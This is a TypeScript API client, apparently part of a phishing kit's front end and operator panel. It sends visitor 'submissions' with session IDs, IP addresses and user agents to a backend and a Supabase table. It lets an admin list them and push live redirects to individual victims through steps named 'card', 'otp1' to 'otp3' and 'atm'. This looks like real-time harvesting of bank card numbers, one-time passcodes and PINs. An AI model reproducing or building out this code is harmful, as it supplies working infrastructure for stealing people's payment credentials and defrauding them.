const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";

async function jsonRequest<T>(path: string, method: string, body?: unknown, token?: string): Promise<T> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }

  const baseUrl = API_BASE_URL.replace(/\/+$/, "");
  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
  const response = await fetch(`${baseUrl}${normalizedPath}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  const raw = await response.text();
  const data = raw ? JSON.parse(raw) : null;
  if (!response.ok) {
    throw new Error(data?.error || response.statusText || "Request failed");
  }

  return data as T;
}

export interface AdminLoginResponse {
  success: boolean;
  token: string;
}

export interface AdminStatsResponse {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

export interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

export interface SubmissionListResponse {
  submissions: SubmissionRow[];
  total: number;
  page: number;
  limit: number;
}

export async function submitSubmission(type: string, body: Record<string, unknown>) {
  return jsonRequest<{ id: number; sessionId: string }>(`/submissions/${type}`, "POST", body);
}

export async function adminLogin(username: string, password: string) {
  return jsonRequest<AdminLoginResponse>("/admin/login", "POST", { username, password });
}

export async function adminLogout(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout", "POST", undefined, token);
}

export async function adminLogoutAll(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout-all", "POST", undefined, token);
}

export async function adminChangePassword(token: string, newPassword: string) {
  return jsonRequest<{ success: boolean }>("/admin/change-password", "POST", { newPassword }, token);
}

export async function getAdminStats(token: string) {
  return jsonRequest<AdminStatsResponse>("/admin/stats", "GET", undefined, token);
}

export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
  const queryString = params ? `?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : "";
  return jsonRequest<SubmissionListResponse>(`/admin/submissions${queryString}`, "GET", undefined, token);
}

export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token);
}

// Fetch submissions directly from Supabase (bypasses API server)
export async function getAdminSubmissionsFromSupabase() {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  
  console.log("📡 Fetching from Supabase:", { supabaseUrl, hasKey: !!supabaseKey });
  
  if (!supabaseUrl || !supabaseKey) {
    console.error("❌ Supabase not configured:", { supabaseUrl: !!supabaseUrl, supabaseKey: !!supabaseKey });
    throw new Error("Supabase not configured");
  }

  try {
    console.log("🔄 Making request to Supabase...");
    const response = await fetch(`${supabaseUrl}/rest/v1/submissions?select=*&order=created_at.desc`, {
      headers: {
        "apikey": supabaseKey,
        "Authorization": `Bearer ${supabaseKey}`,
      },
    });

    console.log("📬 Response status:", response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Supabase error:", response.status, errorText);
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();
    console.log("✅ Received data:", data.length, "submissions");
    return (data || []).map((row: any) => ({
      id: row.id,
      sessionId: row.session_id,
      type: row.type,
      data: typeof row.data === 'string' ? row.data : JSON.stringify(row.data),
      ipAddress: row.ip_address,
      createdAt: row.created_at,
      userAgent: row.user_agent,
    }));
  } catch (error) {
    console.error("❌ Failed to fetch from Supabase:", error);
    throw error;
  }
}

export interface ControlActionResponse {
  action: string | null;
}

export async function getControlAction(sessionId: string) {
  return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
}

export async function sendAdminControl(sessionId: string, action: string, token: string) {
  return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
}

// Send redirect command to Supabase for live navigation control
export type RedirectTarget = 'home' | 'card' | 'otp1' | 'otp2' | 'otp3' | 'atm' | 'success' | 'error';

export async function sendRedirectCommand(sessionId: string, target: RedirectTarget): Promise<boolean> {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  
  if (!supabaseUrl || !supabaseKey) {
    console.warn("Supabase not configured for redirect");
    return false;
  }

  try {
    // Build the payload - match exact column names in database
    const payload = {
      session_id: sessionId,
      action: 'redirect',
      redirect_to: target,
    };

    // Set the new redirect target
    const response = await fetch(`${supabaseUrl}/rest/v1/controls`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Prefer': 'return=minimal',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Failed to send redirect command:", response.status, errorText);
      return false;
    }

    console.log("✅ Redirect command sent:", target, "for session:", sessionId);
    return true;
  } catch (error) {
    console.error("❌ Error sending redirect command:", error);
    return false;
  }
}

// Get pending redirect command for a session
export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: RedirectTarget } | null> {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  
  if (!supabaseUrl || !supabaseKey) return null;

  try {
    const response = await fetch(
      `${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}&action=eq.redirect&order=created_at.desc&limit=1`,
      {
        headers: {
          'apikey': supabaseKey,
          'Authorization': `Bearer ${supabaseKey}`,
        },
      }
    );

    if (!response.ok) return null;

    const data = await response.json();
    if (data && data.length > 0) {
      return { redirect_to: data[0].redirect_to };
    }
  } catch (error) {
    console.error("Error getting pending redirect:", error);
  }

  return null;
}

// Clear redirect command after it's been processed
export async function clearRedirectCommand(sessionId: string): Promise<void> {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  
  if (!supabaseUrl || !supabaseKey) return;

  try {
    await fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}&action=eq.redirect`, {
      method: 'DELETE',
      headers: {
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
      },
    });
  } catch (error) {
    console.error("Error clearing redirect command:", error);
  }
}
